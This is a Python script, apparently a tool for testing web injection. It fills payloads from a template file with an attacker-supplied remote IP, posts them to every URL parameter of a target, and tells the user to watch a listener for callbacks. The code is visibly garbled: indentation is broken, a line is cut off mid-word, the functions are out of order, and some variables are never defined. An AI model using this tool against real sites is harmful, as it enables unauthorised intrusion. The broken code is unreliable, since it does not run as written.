import sys
import requests
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

user_select = int(input('If any of these parameters are not vulnerable, please select the corresponding number: '))
	for i in range(len(found_params)):
		if user_select == (i):
			j = user_select - 1
			value = str(input('Please provide a valid value for this parameter: '))
			popped = found_params.pop(j)
			data[popped] = value
			break
	remote = str(input('Enter in your remote IP address:'))
	for param in found_params:
		data[param] = ''
	fp = open('payload-template.txt', 'r')
	for line in fp:
		payload = line.strip('\n')
		for param in found_params:
			data[param] = payload.replace('<URL_HERE>', remote).replace('<PARAM', param)
		r = requests.post(url, verify=False, params=data)
		print('[+] Submitting payload.')

	print('[+] All payloads have been submitted. Please check your listener for responses.')

	for line in l:
		num_of_li
		
def stage():
	input_url = str(input('Paste URL with parameters: '))

	# REGEX patterns to find target and parameters
	pattern_params = r"[?&]([^?&]+)="
	pattern_target = r"\/\/([^\/]+)"
	found_target = re.search(pattern_target, input_url)
	found_params = re.findall(pattern_params, input_url)
	data = {}

    url = "http://" + found_target.group(1) + "/hijacking/"

def main():
	# Take in target URL, target input fields, actual number of input fields
	if len(sys.argv) != 2:
		print('[-] Usage: %s "<url>"' % sys.argv[0])
		print('[-] Example: %s "www.example.com"' % sys.argv[0])
		sys.exit(-1)

	url = sys.argv[1]
	stage()

if __name__ == '__main__':
	main()

print('Detected {0} payloads . . . Starting POST requests.'.format(num_of_lines))	
inject_payloads()
	
	



	

